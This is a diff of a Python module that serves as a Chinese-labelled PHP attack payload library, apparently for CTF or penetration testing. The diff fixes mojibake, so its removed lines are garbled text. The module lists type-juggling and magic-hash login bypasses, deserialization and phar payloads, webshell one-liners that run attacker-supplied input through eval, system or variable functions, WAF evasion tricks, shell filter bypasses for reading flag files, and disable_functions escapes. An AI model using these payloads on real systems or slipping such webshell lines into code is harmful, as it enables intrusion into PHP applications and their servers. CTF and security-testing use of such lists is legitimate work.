@@ -1,20 +1,20 @@
 # -*- coding: utf-8 -*-
-"""PHP æå·§æ¨¡å.
+"""PHP 技巧模块.
 
-è¦ç:
-    - å¼±ç±»åæ¯è¾ / ç±»åææ³ (Type Juggling)
-    - Magic Hash (0e å¼å¤´)
-    - ååºååæå·§
-    - åéè¦ç
-    - æ­£åç»è¿ (preg_replace / ereg)
-    - ä¼ªéæºæ°ç§å­æ»å»
+覆盖:
+    - 弱类型比较 / 类型戏法 (Type Juggling)
+    - Magic Hash (0e 开头)
+    - 反序列化技巧
+    - 变量覆盖
+    - 正则绕过 (preg_replace / ereg)
+    - 伪随机数种子攻击
 """
 from typing import List, Dict
 
 
-# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
-#  Magic Hash (0e å¼å¤´ â å¼±æ¯è¾ç»è¿)
-# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
+# ═══════════════════════════════════════════════════════════
+#  Magic Hash (0e 开头 — 弱比较绕过)
+# ═══════════════════════════════════════════════════════════
 
 MAGIC_HASHES: Dict[str, List[str]] = {
     "MD5 (0e...)": [
@@ -50,168 +50,168 @@ MAGIC_HASHES: Dict[str, List[str]] = {
     ],
 }
 
-# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
-#  PHP å¼±ç±»åæ¯è¾
-# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
+# ═══════════════════════════════════════════════════════════
+#  PHP 弱类型比较
+# ═══════════════════════════════════════════════════════════
 
 TYPE_JUGGLING: Dict[str, List[Dict[str, str]]] = {
-    "å­ç¬¦ä¸² vs æ°å­": [
-        {"name": "å­ç¬¦ä¸²è½¬ 0", "example": "'abc' == 0  â true"},
-        {"name": "ä»»æå¼ç»è¿", "example": "?password[]=  (æ°ç» vs å­ç¬¦ä¸²)"},
-        {"name": "ç§å­¦è®¡æ°æ³", "example": "'1e1' == '10' â true"},
-        {"name": "NULL ç»è¿", "example": "'0' == false â true, 0 == '0' â true"},
+    "字符串 vs 数字": [
+        {"name": "字符串转 0", "example": "'abc' == 0  → true"},
+        {"name": "任意值绕过", "example": "?password[]=  (数组 vs 字符串)"},
+        {"name": "科学计数法", "example": "'1e1' == '10' → true"},
+        {"name": "NULL 绕过", "example": "'0' == false → true, 0 == '0' → true"},
     ],
-    "strcmp ç»è¿": [
-        {"name": "æ°ç»ç»è¿", "example": "?password[]=anything  # strcmp è¿å NULL"},
-        {"name": "ç©ºå¼ç»è¿", "example": "?password=  (ç©ºå­ç¬¦ä¸²)"},
+    "strcmp 绕过": [
+        {"name": "数组绕过", "example": "?password[]=anything  # strcmp 返回 NULL"},
+        {"name": "空值绕过", "example": "?password=  (空字符串)"},
     ],
-    "switch å¼±ç±»å": [
-        {"name": "switch 0 ç»è¿", "example": "switch(0){case 'abc': ...} â å¹é!"},
+    "switch 弱类型": [
+        {"name": "switch 0 绕过", "example": "switch(0){case 'abc': ...} → 匹配!"},
     ],
-    "in_array å¼±ç±»å": [
-        {"name": "in_array ç»è¿", "example": "in_array(0, ['abc', 'def']) â true!"},
+    "in_array 弱类型": [
+        {"name": "in_array 绕过", "example": "in_array(0, ['abc', 'def']) → true!"},
     ],
-    "preg_match ç»è¿": [
-        {"name": "æ°ç»æ±¡æ", "example": "preg_match('/^[a-z]+$/', []) â false"},
-        {"name": "PCRE åæº¯éå¶", "example": "1MB åå¾æ°æ® + ä½ ç payload â ç»è¿æ­£å"},
+    "preg_match 绕过": [
+        {"name": "数组污染", "example": "preg_match('/^[a-z]+$/', []) → false"},
+        {"name": "PCRE 回溯限制", "example": "1MB 垃圾数据 + 你的 payload → 绕过正则"},
     ],
 }
 
-# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
-#  ååºåå Payload
-# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
+# ═══════════════════════════════════════════════════════════
+#  反序列化 Payload
+# ═══════════════════════════════════════════════════════════
 
 DESERIALIZATION: Dict[str, List[str]] = {
-    "__wakeup ç»è¿": [
-        "CVE-2016-7124: ä¿®æ¹åºååå¯¹è±¡å±æ§æ°éä½¿å¶å¤§äºå®éå¼",
-        "å½å±æ§æ° > å®éå±æ§æ°æ¶, __wakeup ä¸ä¼è¢«è°ç¨",
-        "O:4:\"User\":2:{s:4:\"name\";s:4:\"test\";}  â O:4:\"User\":5:{s:4:\"name\";s:4:\"test\";}",
+    "__wakeup 绕过": [
+        "CVE-2016-7124: 修改序列化对象属性数量使其大于实际值",
+        "当属性数 > 实际属性数时, __wakeup 不会被调用",
+        "O:4:\"User\":2:{s:4:\"name\";s:4:\"test\";}  → O:4:\"User\":5:{s:4:\"name\";s:4:\"test\";}",
     ],
-    "åºç¡ååºåå Payload": [
-        'O:8:"stdClass":0:{}',                                    # ç©ºå¯¹è±¡
-        'O:4:"Test":1:{s:4:"file";s:11:"/etc/passwd";}',          # ç®åå¯¹è±¡
-        'a:2:{i:0;s:3:"foo";i:1;s:3:"bar";}',                     # æ°ç»
-        'C:11:"ArrayObject":21:{x:i:0;a:0:{};m:a:0:{}}',          # èªå®ä¹åºåå
+    "基础反序列化 Payload": [
+        'O:8:"stdClass":0:{}',                                    # 空对象
+        'O:4:"Test":1:{s:4:"file";s:11:"/etc/passwd";}',          # 简单对象
+        'a:2:{i:0;s:3:"foo";i:1;s:3:"bar";}',                     # 数组
+        'C:11:"ArrayObject":21:{x:i:0;a:0:{};m:a:0:{}}',          # 自定义序列化
     ],
-    "Phar ååºåå": [
-        "phar://uploaded.jpg/shell.php",   # å° phar ä¼ªè£æ jpg ä¸ä¼ 
-        "phar://./uploaded.jpg/test.txt",  # ç»è¿æä»¶å­å¨æ£æ¥
+    "Phar 反序列化": [
+        "phar://uploaded.jpg/shell.php",   # 将 phar 伪装成 jpg 上传
+        "phar://./uploaded.jpg/test.txt",  # 绕过文件存在检查
     ],
 }
 
-# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
-#  PHP ä»£ç æ§è¡ Bypass
-# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
+# ═══════════════════════════════════════════════════════════
+#  PHP 代码执行 Bypass
+# ═══════════════════════════════════════════════════════════
 
 PHP_RCE_BYPASS: Dict[str, List[str]] = {
-    "å½ä»¤æ§è¡ - æ å­æ¯æ°å­": [
+    "命令执行 - 无字母数字": [
         "$_=[];$__=$_.__;$_=($_==$__);$___=$_+$_;$__=++$_;$___=$__+$_;...",
-        r"ç¨ä½è¿ç®: $__=(''==''); $__=$__.$__; $_=$__[0].$__[0]; ...",
+        r"用位运算: $__=(''==''); $__=$__.$__; $_=$__[0].$__[0]; ...",
     ],
-    "å¸¸è§å½ä»¤æ§è¡å½æ°": [
+    "常见命令执行函数": [
         "system('id')", "exec('id')", "passthru('id')",
         "shell_exec('id')", "popen('id','r')",
         "proc_open('id',[],$p)", "pcntl_exec('/bin/sh')",
         "`id`", "eval('system(\"id\");')",
         "assert('system(\"id\")')",
-        "preg_replace('/.*/e','system(\"id\")','')",  # /e ä¿®é¥°ç¬¦ (PHP<7)
+        "preg_replace('/.*/e','system(\"id\")','')",  # /e 修饰符 (PHP<7)
         "create_function('','system(\"id\")')();",
         "array_map('system',['id'])",
         "array_walk(['id'],'system')",
     ],
-    "WAFç»è¿-åå": [
-        "eval â evaleval", "assert â asserassertt",
-        "system â syssystemtem", "exec â exexecec",
-        "@ini_set â @ini@ini_setset",
+    "WAF绕过-双写": [
+        "eval → evaleval", "assert → asserassertt",
+        "system → syssystemtem", "exec → exexecec",
+        "@ini_set → @ini@ini_setset",
     ],
-    "WAFç»è¿-å¤§å°å": [
+    "WAF绕过-大小写": [
         "Eval / eVaL / EvAl", "System / SYSTEM / syStem",
         "PhpInfo / phpinfo",
     ],
-    "WAFç»è¿-å½æ°æ¿æ¢": [
-        "eval â assert", "eval â preg_replace('/.*/e',...)",
-        "system â shell_exec / passthru / exec",
-        "åå¼å·å½ä»¤: `id`",
+    "WAF绕过-函数替换": [
+        "eval → assert", "eval → preg_replace('/.*/e',...)",
+        "system → shell_exec / passthru / exec",
+        "反引号命令: `id`",
     ],
-    "WAFç»è¿-å¯åå½æ°": [
+    "WAF绕过-可变函数": [
         "$_GET['a']($_GET['b']);", "$_POST['f']($_POST['p']);",
         "$func = $_REQUEST['c']; $func();",
     ],
-    "WAFç»è¿-å­ç¬¦ä¸²æ¼æ¥": [
+    "WAF绕过-字符串拼接": [
         "$a='sy'.'stem'; $a('id');",
         "$b='ev'.'al'; $b($_POST[1]);",
     ],
-    "WAFç»è¿-ç¼ç æ§è¡": [
+    "WAF绕过-编码执行": [
         "base64_decode('ZXZhbCgkX1BPU1RbMV0p');",
-        "gzinflate(base64_decode('åç¼©æ°æ®'));",
-        "str_rot13('riny') â eval",
+        "gzinflate(base64_decode('压缩数据'));",
+        "str_rot13('riny') → eval",
     ],
-    "WAFç»è¿-åææ åå²": [
+    "WAF绕过-反斜杠分割": [
         "\\s\\y\\s\\t\\e\\m('id');",
         "\\e\\v\\a\\l(\\$_POST[1]);",
-        "PHP å½æ°ååè®¸åææ ",
+        "PHP 函数名允许反斜杠",
     ],
-    "WAFç»è¿-è¶çº§å¨å±åé": [
+    "WAF绕过-超级全局变量": [
         "$GLOBALS['_GET']['_']($GLOBALS['_GET']['__']);",
         "$_ = 'system'; $_('id');",
     ],
-    "WAFç»è¿-create_function": [
+    "WAF绕过-create_function": [
         "create_function('', $_GET['c']);",
         "create_function('', 'return '.$_POST['code'].';')();",
     ],
-    "WAFç»è¿-call_user_func": [
+    "WAF绕过-call_user_func": [
         "call_user_func('system', 'id');",
         "call_user_func_array('assert', [$_POST[1]]);",
     ],
-    "WAFç»è¿-æ°ç»å­å¨": [
+    "WAF绕过-数组存储": [
         "$a=['system','id']; $a[0]($a[1]);",
         "$a=['eval',$_POST[1]]; $a[0]($a[1]);",
     ],
-    "å¸¸è§ Bypass æå·§": [
-        "ç©ºæ ¼: cat${IFS}/flag æ cat<>/flag æ {cat,/flag}",
-        "ææ : cat $(echo L2ZsYWc=|base64 -d)",
-        "å³é®å­: c''at /fl''ag æ c\at /fl\ag",
+    "常见 Bypass 技巧": [
+        "空格: cat${IFS}/flag 或 cat<>/flag 或 {cat,/flag}",
+        "斜杠: cat $(echo L2ZsYWc=|base64 -d)",
+        "关键字: c''at /fl''ag 或 c\at /fl\ag",
         "base64: echo 'Y2F0IC9mbGFn' | base64 -d | sh",
         "hex: echo '636174202f666c6167' | xxd -r -p | sh",
-        "ééç¬¦: /???/c?t /???/f??g",
-        "ç¯å¢åé: cat $HOME/flag.txt",
+        "通配符: /???/c?t /???/f??g",
+        "环境变量: cat $HOME/flag.txt",
         "printf: $(printf '\\143\\141\\164\\40\\57flag')",
     ],
-    "disable_functions ç»è¿": [
-        "LD_PRELOAD æ³¨å¥: mail() + putenv()",
+    "disable_functions 绕过": [
+        "LD_PRELOAD 注入: mail() + putenv()",
         "FFI::cdef (PHP 7.4+)",
-        "ImageMagick å©ç¨ (GhostScript)",
-        "å©ç¨æªç¦ç¨çå½æ°: proc_open, pcntl_exec, dl",
-        "PHP-FPM æªææè®¿é® (å©ç¨ Gopher åè®®)",
-        "å©ç¨ UAF / heap overflow (é«çº§)",
+        "ImageMagick 利用 (GhostScript)",
+        "利用未禁用的函数: proc_open, pcntl_exec, dl",
+        "PHP-FPM 未授权访问 (利用 Gopher 协议)",
+        "利用 UAF / heap overflow (高级)",
     ],
 }
 
 
 def get_magic_hashes(algo: str = "") -> dict:
-    """è·å Magic Hash (0e å¼å¤´)."""
+    """获取 Magic Hash (0e 开头)."""
     if algo and algo.upper() in MAGIC_HASHES:
         return {algo.upper(): MAGIC_HASHES[algo.upper()]}
     return MAGIC_HASHES
 
 
 def get_type_juggling() -> dict:
-    """è·åå¼±ç±»åæ¯è¾ Payload."""
+    """获取弱类型比较 Payload."""
     return TYPE_JUGGLING
 
 
 def get_deserialization() -> dict:
-    """è·åååºåå Payload."""
+    """获取反序列化 Payload."""
     return DESERIALIZATION
 
 
 def get_rce_bypass() -> dict:
-    """è·å PHP RCE Bypass æå·§."""
+    """获取 PHP RCE Bypass 技巧."""
     return PHP_RCE_BYPASS
 
 
 def search_keyword(keyword: str) -> list:
-    """å¨ææ PHP Payload ä¸­æç´¢."""
+    """在所有 PHP Payload 中搜索."""
     results = []
     all_data = {**MAGIC_HASHES, **PHP_RCE_BYPASS}
     for section, items in all_data.items():
